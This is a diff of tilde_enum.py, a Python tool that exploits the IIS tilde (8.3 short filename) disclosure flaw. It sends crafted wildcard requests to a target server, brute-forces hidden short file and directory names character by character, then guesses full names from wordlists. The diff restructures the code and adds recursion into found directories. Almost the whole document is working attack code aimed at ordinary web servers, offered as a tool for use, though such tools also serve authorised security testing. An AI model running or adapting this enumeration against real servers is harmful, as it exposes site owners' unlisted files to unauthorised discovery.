@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 
-
 """
 -------------------------------------------------------------------------------
 Name:		tilde_enum.py
@@ -9,9 +8,14 @@ Authors:	Ryan Tierney (nu11by73) and Micah Hoffman (@WebBreacher)
 -------------------------------------------------------------------------------
 """
 
-import os, sys, argparse, random, string
+import os
+import sys
+import argparse
+import random
+import string
 from urllib2 import Request, urlopen, URLError
 from urlparse import urlparse
+
 
 #=================================================
 # Constants and Variables
@@ -120,7 +124,7 @@ def searchFileForString(targetstring, filename):
     # Open the wordlist file (or try to)
     try:
         wordlist = open(filename,'r').readlines()
-    except IOError:
+    except (IOError) :
         print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
         sys.exit()
 
@@ -153,7 +157,7 @@ def checkForTildeVuln(url):
             sys.exit()
     else:
         print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
-        print               '[!]     (Request error: %s)' % server_header.getcode()
+        print				'[!]     (Request error: %s)' % server_header.getcode()
         print 				'[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
         sys.exit()
 
@@ -169,40 +173,40 @@ def checkForTildeVuln(url):
     return check_string
 
 
-def findExtension(url, dirname, filename):
+def findExtension(url, filename):
     # Find out how many chars the extension has
-    resp1 = getWebServerResponse(url+dirname+filename+'~1.%3f/.aspx')		# 1 extension chars
-    resp2 = getWebServerResponse(url+dirname+filename+'~1.%3f%3f/.aspx')	# 2 extension chars
-    resp3 = getWebServerResponse(url+dirname+filename+'~1.%3f%3f%3f/.aspx')	# 3+ extension chars
+    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')		# 1 extension chars
+    resp2 = getWebServerResponse(url+filename+'~1.%3f%3f/.aspx')	# 2 extension chars
+    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx')	# 3+ extension chars
 
     if resp1.code == 404:
         for char1 in chars:
-            resp1a = getWebServerResponse(url+dirname+filename+'~1.'+char1+'%3f%3f/.aspx')
+            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
             if resp1a.code == 404:  # Got the first valid char
-                print bcolors.YELLOW + '[+]  Found filename:  ' + filename+' . '+char1+bcolors.ENDC
+                print bcolors.YELLOW + '[+]  Found file:  ' + filename+' . '+char1+bcolors.ENDC
                 return filename+'.'+char1
 
     elif resp1.code == 500 and resp2.code == 404:
         for char1 in chars:
-            resp1a = getWebServerResponse(url+dirname+filename+'~1.'+char1+'%3f%3f/.aspx')
+            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
-                    resp2a = getWebServerResponse(url+dirname+filename+'~1.'+char1+char2+'%3f/.aspx')
+                    resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
                     if resp2a.code == 404:  # Got the second valid char
-                        print bcolors.YELLOW + '[+]  Found filename:  ' +filename+' . '+char1+char2+bcolors.ENDC
+                        print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+bcolors.ENDC
                         return filename+'.'+char1+char2
 
     elif resp1.code == 500 and resp2.code == 500 and resp3.code == 404:
         for char1 in chars:
-            resp1a = getWebServerResponse(url+dirname+filename+'~1.'+char1+'%3f%3f/.aspx')
+            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
-                    resp2a = getWebServerResponse(url+dirname+filename+'~1.'+char1+char2+'%3f/.aspx')
+                    resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
                     if resp2a.code == 404:  # Got the second valid char
                         for char3 in chars:
-                            resp3a = getWebServerResponse(url+dirname+filename+'~1.'+char1+char2+char3+'%3f/.aspx')
+                            resp3a = getWebServerResponse(url+filename+'~1.'+char1+char2+char3+'%3f/.aspx')
                             if resp3a.code == 404:  # Got the third valid char
-                                print bcolors.YELLOW + '[+]  Found filename:  ' +filename+' . '+char1+char2+char3+bcolors.ENDC
+                                print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+char3+bcolors.ENDC
                                 return filename+'.'+char1+char2+char3
 
 
@@ -226,77 +230,81 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
     if url[-1:] != '/':
         url = url + '/'
 
+    # Break apart the url
+    u = urlparse(url)
+    dirname = u.path
+
     for char in chars:
-        resp1 = getWebServerResponse(url+dirname+char+check_string)
+        resp1 = getWebServerResponse(url+char+check_string)
         if resp1.code == 404:  # Got the first valid char
 
+            # TODO - Use these or remove these
             # Check to see if the word is longer than just this char
-            # TODO - Use or remove these lengths
-            length_gauge2 = getWebServerResponse(url+dirname+char+'~1*/.aspx')					# 2 char filename
-            length_gauge3 = getWebServerResponse(url+dirname+char+'%3f~1*/.aspx')				# 3 char filename
-            length_gauge4 = getWebServerResponse(url+dirname+char+'%3f%3f~1*/.aspx')			# 4 char filename
-            length_gauge5 = getWebServerResponse(url+dirname+char+'%3f%3f%3f~1*/.aspx')			# 5 char filename
-            length_gauge6 = getWebServerResponse(url+dirname+char+'%3f%3f%3f%3f~1*/.aspx')		# 6 char filename
-            length_gauge7 = getWebServerResponse(url+dirname+char+'%3f%3f%3f%3f%3f~1*/.aspx')	# 7 char filename
+            length_gauge2 = getWebServerResponse(url+char+'~1*/.aspx')					# 2 char filename
+            length_gauge3 = getWebServerResponse(url+char+'%3f~1*/.aspx')				# 3 char filename
+            length_gauge4 = getWebServerResponse(url+char+'%3f%3f~1*/.aspx')				# 4 char filename
+            length_gauge5 = getWebServerResponse(url+char+'%3f%3f%3f~1*/.aspx')			# 5 char filename
+            length_gauge6 = getWebServerResponse(url+char+'%3f%3f%3f%3f~1*/.aspx')		# 6 char filename
+            length_gauge7 = getWebServerResponse(url+char+'%3f%3f%3f%3f%3f~1*/.aspx')	# 7 char filename
 
             for char2 in chars:
-                resp2 = getWebServerResponse(url+dirname+char+char2+check_string)
+                resp2 = getWebServerResponse(url+char+char2+check_string)
 
                 if resp2.code == 404:  # Got the second valid char
                     for char3 in chars:
-                        resp3 = getWebServerResponse(url+dirname+char+char2+char3+check_string)
+                        resp3 = getWebServerResponse(url+char+char2+char3+check_string)
 
                         if resp3.code == 404:  # Got the third valid char
                             if length_gauge4.code == 404:
-                                if checkForDirectory(url+dirname+char+char2+char3):
+                                if checkForDirectory(url+char+char2+char3):
                                     print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3 + bcolors.ENDC
                                     findings_dir.append(char+char2+char3)
                                 else:
                                     # Now that we have the file name, go get the extension
-                                    filename = findExtension(url, dirname, char+char2+char3)
+                                    filename = findExtension(url, char+char2+char3)
                                     files.append(filename)
                                     continue
                             else:
                                 for char4 in chars:
-                                    resp4 = getWebServerResponse(url+dirname+char+char2+char3+char4+check_string)
+                                    resp4 = getWebServerResponse(url+char+char2+char3+char4+check_string)
 
                                     if resp4.code == 404:  # Got the fourth valid char
                                         if length_gauge5.code == 404:
-                                            if checkForDirectory(url+dirname+char+char2+char3+char4):
+                                            if checkForDirectory(url+char+char2+char3+char4):
                                                 print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3+char4 + bcolors.ENDC
                                                 findings_dir.append(char+char2+char3+char4)
                                             else:
                                                 # Now that we have the file name, go get the extension
-                                                filename = findExtension(url, dirname, char+char2+char3+char4)
+                                                filename = findExtension(url, char+char2+char3+char4)
                                                 files.append(filename)
                                                 continue
                                         else:
                                             for char5 in chars:
-                                                resp5 = getWebServerResponse(url+dirname+char+char2+char3+char4+char5+check_string)
+                                                resp5 = getWebServerResponse(url+char+char2+char3+char4+char5+check_string)
 
                                                 if resp5.code == 404:  # Got the fifth valid char
                                                     if length_gauge5.code == 404:
-                                                        if checkForDirectory(url+dirname+char+char2+char3+char4+char5):
+                                                        if checkForDirectory(url+char+char2+char3+char4+char5):
                                                             print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3+char4+char5 + bcolors.ENDC
                                                             findings_dir.append(char+char2+char3+char4+char5)
                                                         else:
                                                             # Now that we have the file name, go get the extension
-                                                            filename = findExtension(url, dirname, char+char2+char3+char4+char5)
+                                                            filename = findExtension(url, char+char2+char3+char4+char5)
                                                             files.append(filename)
                                                             continue
                                                     else:
                                                         if resp5.code == 404:  # Got the fifth valid char
                                                             for char6 in chars:
-                                                                resp6 = getWebServerResponse(url+dirname+char+char2+char3+char4+char5+char6+check_string)
+                                                                resp6 = getWebServerResponse(url+char+char2+char3+char4+char5+char6+check_string)
 
                                                                 if resp6.code == 404:  # Got the sixth valid char
                                                                     # Check to see if this is a directory or file
-                                                                    if checkForDirectory(url+dirname+char+char2+char3+char4+char5+char6):
+                                                                    if checkForDirectory(url+char+char2+char3+char4+char5+char6):
                                                                         print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3+char4+char5+char6 + bcolors.ENDC
                                                                         findings_dir.append(char+char2+char3+char4+char5+char6)
                                                                     else:
                                                                         # Now that we have the file name, go get the extension
-                                                                        filename = findExtension(url, dirname, char+char2+char3+char4+char5+char6)
+                                                                        filename = findExtension(url, char+char2+char3+char4+char5+char6)
                                                                         files.append(filename)
 
     # Store the file in a dictionary by directory. This will be important in the future when we do recursive tests
@@ -304,44 +312,11 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
 
     findings['files'] = findings_file
     findings['dirs'] = sorted(findings_dir)
-    print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration for %s.' % url + bcolors.ENDC
+    print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration for %s.' % dirname + bcolors.ENDC
     return findings
 
 
-def main():
-    # Check the User-supplied URL
-    if args.url:
-        response_code = initialCheckUrl(args.url)
-    else:
-        print bcolors.RED + '[!]  You need to enter a valid URL for us to test.' + bcolors.ENDC
-        sys.exit()
-
-    if args.v: print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC
-
-    # Check to see if the remote server is IIS and vulnerable to the Tilde issue
-    check_string = checkForTildeVuln(args.url)
-
-    url = urlparse(args.url)
-    url_good = url.scheme + '://' + url.netloc + url.path
-
-    # Do the initial search for files in the root of the web server
-    findings = checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
-
-    if args.v:
-        print bcolors.PURPLE + 'Files: %s' % findings['files']
-        print 'Dirs: %s' %  findings['dirs'] + bcolors.ENDC
-
-
-    # TODO - Directory recursion
-    # Now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
-    # Wait to implement this as we'll have to go through and look up these 6 char words in another wordlist
-    #for dir in findings['dirs']:
-    #	findings = checkEightDotThreeEnum(url_good, check_string, dir)
-
-    # Start the URL requests to the server
-    print bcolors.GREEN + '[-]  Now starting the word guessing using word list calls' + bcolors.ENDC
-
-    # So the URL is live and gives 200s back (otherwise script would have exit'd)
+def performLookups(findings, url_good):
     # Find matches to the filename in our word list
     for dirname in findings['files'].keys():
         ext_matches= []
@@ -353,10 +328,10 @@ def main():
 
             # Go search the user's word list file for matches for the file
             if len(filename) < 6:
-                print bcolors.GREEN + '[-]  File name (%s) too  to look up in word list. We will use it to bruteforce.' % filename + bcolors.ENDC
+                print bcolors.GREEN + '[-]  File name (%s) too short to look up in word list. We will use it to bruteforce.' % filename + bcolors.ENDC
                 filename_matches.append(filename)
             else:
-                print '[+]  Searching for %s in word list' % filename
+                if args.v: print bcolors.PURPLE + '[-]  Searching for %s in word list' % filename + bcolors.ENDC
                 filename_matches = searchFileForString(filename, args.wordlist)
 
             # If nothing came back from the search, just try use the original string
@@ -369,10 +344,9 @@ def main():
                 print bcolors.GREEN + '[-]  Extension (%s) too short to look up in word list. We will use it to bruteforce.' % ext + bcolors.ENDC
                 ext_matches.append(ext.lower())
             else:
-                print '[+]  Searching for %s in extension word list' % ext
+                if args.v: print bcolors.PURPLE + '[-]  Searching for %s in extension word list' % ext + bcolors.ENDC
                 ext_matches = searchFileForString(ext, exts)
             if args.v: print bcolors.PURPLE + '[+]  Extension matches for %s are: %s' % (ext, ext_matches) + bcolors.ENDC
-
 
             # Now do the real hard work of cycling through each filename_matches and adding the ext_matches,
             # do the look up and examine the response codes to see if we found a file.
@@ -380,7 +354,10 @@ def main():
                 for e in ext_matches:
                     test_response_code, test_response_length = '', ''
 
-                    url_to_try = url_good + '/' + line + '.' + e.rstrip()
+                    if url_good[-1] != '/':
+                        url_to_try = url_good + '/' + line + '.' + e.rstrip()
+                    else:
+                        url_to_try = url_good + line + '.' + e.rstrip()
                     url_response = getWebServerResponse(url_to_try)
 
                     # Pull out just the HTTP response code number
@@ -407,14 +384,14 @@ def main():
     # Match directory names
     print bcolors.GREEN + '[-]  Trying to find directory matches now.' + bcolors.ENDC
     if args.dirwordlist:
-        print bcolors.GREEN + '[-]  -d option recognized. Using the %s file for directory name look-ups.' % args.dirwordlist + bcolors.ENDC
+        print bcolors.GREEN + '[-]  You used the "-d" option.\n      Using %s for directory name look-ups.' % args.dirwordlist + bcolors.ENDC
     else:
         print bcolors.GREEN + '[-]  Using the general wordlist to discover directory names.'
         print                 '       If this does not work well, consider using the -d argument and providing a directory name wordlist.' + bcolors.ENDC
 
     for dirname in findings['dirs']:
         # Go search the user's word list file for matches for the directory name
-        if args.v: print bcolors.PURPLE + '[+]  Searching for %s in word list' % dir + bcolors.ENDC
+        if args.v: print bcolors.PURPLE + '[+]  Searching for %s in word list' % dirname + bcolors.ENDC
         if args.dirwordlist:
             dir_matches = searchFileForString(dirname, args.dirwordlist)
         else:
@@ -423,7 +400,8 @@ def main():
         # If nothing came back from the search, just try use the original string
         if not dir_matches:
             dir_matches.append(dirname)
-        if args.v: print bcolors.PURPLE + '[+]  Directory name matches for %s are: %s' % (dirname, dir_matches) + bcolors.ENDC
+        if args.v:
+            print bcolors.PURPLE + '[+]  Directory name matches for %s are: %s' % (dirname, dir_matches) + bcolors.ENDC
 
         # Now try to guess the live dir name
         for matches in dir_matches:
@@ -442,8 +420,7 @@ def main():
             else:
                 test_response_code = 0
 
-            if args.v:
-                print '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code)
+            if args.v: print '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code)
 
             # Here is where we figure out if we found something or just found something odd
             if test_response_code == response_code['user_code']:
@@ -453,10 +430,58 @@ def main():
                 print bcolors.YELLOW + '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response) + bcolors.ENDC
                 findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)
 
+
+def main():
+    # Check the User-supplied URL
+    if args.url:
+        response_code = initialCheckUrl(args.url)
+    else:
+        print bcolors.RED + '[!]  You need to enter a valid URL for us to test.' + bcolors.ENDC
+        sys.exit()
+
+    if args.v:
+        print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC
+
+    # Check to see if the remote server is IIS and vulnerable to the Tilde issue
+    check_string = checkForTildeVuln(args.url)
+
+    # Break apart the url
+    url = urlparse(args.url)
+    url_good = url.scheme + '://' + url.netloc + url.path
+
+    # Do the initial search for files in the root of the web server
+    findings = checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
+
+    if args.v:
+        print bcolors.PURPLE + 'Files: %s' % findings['files']
+        print 'Dirs: %s' % findings['dirs'] + bcolors.ENDC
+
+    # Start the URL requests to the server
+    print bcolors.GREEN + '[-]  Now starting the word guessing using word list calls' + bcolors.ENDC
+
+    # So the URL is live and gives 200s back (otherwise script would have exit'd)
+    performLookups(findings, url_good)
+
+    if findings_dir_final:
+        print bcolors.GREEN + '[-]  Now starting recursive 8.3 enumeration into the directories we found.' + bcolors.ENDC
+
+    # Now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
+    for dirname in findings_dir_final:
+        # Strip off the dir
+        url_good = dirname.split()[0]
+
+        print bcolors.GREEN + '[-]  Diving into the %s dir.' % url_good + bcolors.ENDC
+
+        # Do the 8.3 discovery for this dir
+        checkEightDotThreeEnum(url_good, check_string)
+
+        # So the URL is live and gives 200s back (otherwise script would have exit'd)
+        performLookups(findings, url_good)
+
     # Output findings
     if findings_final:
         print '\n---------- FINAL OUTPUT ------------------------------'
-        print bcolors.YELLOW + '[*]  We found files for you to look at' + bcolors.ENDC
+        print bcolors.YELLOW + '[*]  We found files for you to look at:' + bcolors.ENDC
         for out in sorted(findings_final):
             print bcolors.CYAN + '[*]      %s' % out + bcolors.ENDC
     else:
@@ -471,16 +496,16 @@ def main():
             if not filename: continue
             # Break apart the file into filename and extension
             filename, ext = os.path.splitext(filename)
-            print '[*]      %s%s%s~1%s' % (url_good, dirname, filename, ext)
+            print '[*]      %s://%s%s%s~1%s' % (url.scheme, url.netloc, dirname, filename, ext)
 
     if findings_dir_final:
-        print bcolors.YELLOW + '\n[*]  We found directories for you to look at' + bcolors.ENDC
+        print bcolors.YELLOW + '\n[*]  We found directories for you to look at:' + bcolors.ENDC
         for out in sorted(findings_dir_final):
             print bcolors.CYAN + '[*]      %s' % out + bcolors.ENDC
 
     print bcolors.YELLOW + '\n[*]  Here are all the directory names we found. You may wish to try to guess them yourself too.' + bcolors.ENDC
     for dirname in sorted(findings['dirs']):
-        print '[*]      %s/%s/' % (url_good, dirname)
+        print '[?]      %s/%s~1/' % (url.scheme + '://' + url.netloc, dirname)
 
     if findings_other:
         print bcolors.YELLOW + '\n[*]  We found URLs you check out. They were not HTTP response code 200s.' + bcolors.ENDC
@@ -556,5 +581,4 @@ else:
 if args.v:
     print bcolors.PURPLE + '[-]  Entering "Verbose Mode"....brace yourself for additional information.' + bcolors.ENDC
 
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
